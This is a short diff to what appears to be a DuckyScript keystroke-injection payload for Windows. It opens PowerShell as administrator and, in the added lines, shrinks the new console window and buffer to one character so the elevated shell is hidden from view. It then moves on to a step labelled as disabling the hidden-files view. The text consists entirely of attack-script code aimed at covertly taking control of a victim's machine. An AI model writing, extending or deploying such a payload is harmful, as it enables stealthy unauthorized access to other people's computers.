@@ -15,11 +15,11 @@ STRING powershell
 ENTER
 DELAY 200
 
-REM --Start Powershell As Administrator & Exit Current Shell--
+REM --Start Powershell As Administrator, Modify Window's Height & Width to 1 & Exit Current Shell--
 
-STRING  Start-Process Powershell -Verb runAs; exit
+STRING  Start-Process Powershell '-noexit -command "[console]::windowwidth=1; [console]::windowheight=1; [console]::bufferwidth=[console]::windowwidth"' -Verb runAs; exit
 ENTER
-DELAY 300
+DELAY 2000
 
 REM -- Disable Hidden Files View--
 
